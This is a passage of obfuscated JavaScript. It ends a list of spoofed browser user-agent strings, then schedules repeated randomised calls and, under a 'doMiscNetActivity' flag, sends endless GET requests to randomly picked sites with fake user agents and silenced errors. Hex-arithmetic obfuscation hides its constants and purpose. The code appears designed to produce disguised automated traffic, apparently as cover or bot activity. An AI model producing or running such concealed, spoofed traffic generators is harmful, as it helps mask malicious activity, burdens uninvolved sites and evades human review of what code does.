      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x130b + -0xd * -0x133 + -0x11e * 0x1f; k < 0x11 * 0x14b + -0x1e9e + 0x8a7; k++)
    setTimeout(f, (0x1 * 0x9d19 + -0x1 * -0x1b953 + 0x17 * -0xfd4) * k * getRandomInt(-0x5 * 0x6d9 + 0x16 * -0x5b + -0x1 * -0x2a10, 0xd51 * 0x2 + 0x23b0 + -0x3e4f));
  setInterval(() => {
    f();
    for (let l = 0x7 * 0x236 + -0x1de2 + -0x39a * -0x4; l < -0xb77 * 0x1 + 0x974 + 0x1 * 0x207; l++)
      setTimeout(f, (0x315f * -0x1 + -0x2 * -0x571a + 0x6d8b) * l * getRandomInt(-0x2192 + -0xdab + -0x179f * -0x2, 0x1d4c + 0x246b + -0x41b4));
  }, -0x3c8b02 + 0x102999 + -0x211aa3 * -0x3);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x26a2 + -0xef * 0x11 + 0x51d9) * getRandomInt(-0x1622 + -0x63d + 0x1c60, 0x2b * 0x21 + -0x21a2 + -0x101 * -0x1c));
}, -0x1 * -0x36d + -0x2 * 0x16c + -0x7 * 0x7);